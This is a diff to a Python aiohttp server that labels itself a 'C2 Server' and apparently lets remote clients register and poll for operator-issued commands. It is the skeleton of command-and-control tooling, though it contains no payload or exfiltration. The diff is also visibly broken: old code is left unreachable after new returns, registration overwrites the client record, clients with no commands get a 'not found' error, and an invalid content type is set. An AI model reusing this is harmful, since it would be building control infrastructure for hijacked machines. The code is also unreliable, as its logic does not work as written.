@@ -1,6 +1,8 @@
 import aiohttp
 import asyncio
 from aiohttp import web
+import json
+import time
 
 # In-memory storage for connected clients and commands
 clients = {}
@@ -15,6 +17,8 @@ async def register_client(request):
         return web.json_response({"error": "Missing client_id"}, status=400)
 
     clients[client_id] = {"status": "connected"}
+    print(f"Registered client: {client_id}")  # Debugging line
+    clients[client_id] = {"last_seen": time.time()}  # Update last seen time
     return web.json_response({"message": "Client registered", "client_id": client_id})
 
 async def get_command(request):
@@ -23,6 +27,14 @@ async def get_command(request):
     
     if client_id not in clients:
         return web.json_response({"error": "Client not found"}, status=404)
+
+    if client_id not in commands:
+        return web.json_response({"error": "Client not found"}, status=404)  # <-- This is your error
+    
+    if commands[client_id]:
+        return web.json_response({"command": commands[client_id].pop(0)})
+    
+    return web.json_response({"command": None})  # No command yet
 
     command = commands.pop(client_id, None)  # Retrieve and remove the command
     return web.json_response({"command": command if command else "ping"})
@@ -52,9 +64,11 @@ async def issue_command(request):
     return web.json_response({"message": f"Command '{command}' sent to {client_id}"})
 
 async def index(request):
-    return web.Response(text="C2 Server Running", content_type="text/html")
+    return web.Response(text="C2 Server Running", content_type="json") #text/html
 
 app = web.Application()
+app.router.add_post("/register", register_client)  
+app.router.add_get("/command/{client_id}", get_command)  
 app.router.add_get("/", index)  # Add this route
 
 web.run_app(app, host="localhost", port=8080)
